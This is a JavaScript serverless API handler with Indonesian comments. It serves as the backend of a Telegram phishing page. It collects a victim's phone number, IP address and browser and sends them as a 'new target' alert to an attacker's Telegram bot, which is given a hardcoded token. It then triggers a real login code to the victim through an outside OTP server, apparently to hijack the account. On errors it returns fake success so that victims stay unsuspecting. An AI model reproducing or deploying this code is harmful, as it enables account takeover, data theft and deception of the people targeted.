// API untuk kirim OTP real
export default async function handler(req, res) {
  // Izinkan akses dari mana saja
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Tangani preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Hanya terima POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Ambil nomor dari request
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ error: 'Nomor HP diperlukan' });
    }
    
    // Info client
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log('📱 Menerima nomor:', phone);
    console.log('📍 IP Address:', ip);
    
    // ================= KIRIM KE BOT TELEGRAM =================
    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = process.env.CHAT_ID || '7933552719';
    
    const botMessage = `🚨 *TARGET BARU* \n\n📱 *Nomor:* \`${phone}\`\n📍 *IP:* \`${ip}\`\n🌐 *Browser:* \`${userAgent.substring(0, 50)}\`\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
    
    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: botMessage,
        parse_mode: 'Markdown'
      })
    });
    
    const botResult = await telegramResponse.json();
    console.log('🤖 Bot response:', botResult.ok ? 'SUKSES' : 'GAGAL');
    
    // ================= KIRIM OTP ASLI =================
    const OTP_SERVER = process.env.OTP_SERVER || 'https://otp-server.up.railway.app';
    
    let otpSent = false;
    try {
      const otpResponse = await fetch(`${OTP_SERVER}/send-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phone: phone,
          timestamp: new Date().toISOString()
        })
      });
      
      const otpData = await otpResponse.json();
      otpSent = otpData.success === true;
      console.log('🔐 OTP Server:', otpSent ? 'TERKIRIM' : 'GAGAL');
      
    } catch (otpError) {
      console.log('⚠️ OTP Server error:', otpError.message);
    }
    
    // Simpan nomor di cookie untuk nanti
    res.setHeader('Set-Cookie', `target_phone=${encodeURIComponent(phone)}; Path=/; Max-Age=300; SameSite=Lax`);
    
    // Beri respons ke user
    return res.status(200).json({
      success: true,
      message: 'Kode verifikasi telah dikirim ke Telegram Anda',
      otp_sent: otpSent,
      note: 'Periksa aplikasi Telegram Anda untuk kode 5 digit'
    });
    
  } catch (error) {
    console.error('❌ ERROR:', error);
    
    // Tetap beri respons sukses biar user tidak curiga
    return res.status(200).json({
      success: true,
      message: 'Kode verifikasi dikirim',
      otp_sent: false,
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
}
